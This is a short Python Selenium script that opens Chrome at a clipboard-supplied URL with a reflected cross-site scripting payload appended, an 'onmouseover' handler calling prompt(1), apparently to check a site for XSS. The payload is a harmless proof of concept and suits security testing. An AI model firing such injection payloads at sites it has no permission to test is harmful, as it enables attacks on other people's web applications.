from selenium import webdriver
import os
import pyperclip as pc
driver = webdriver.Chrome(executable_path="7.exe")
driver.maximize_window()
driver.get('{}<var onmouseover="prompt(1)"> XSS Found again</var>'.format(pc.paste()))
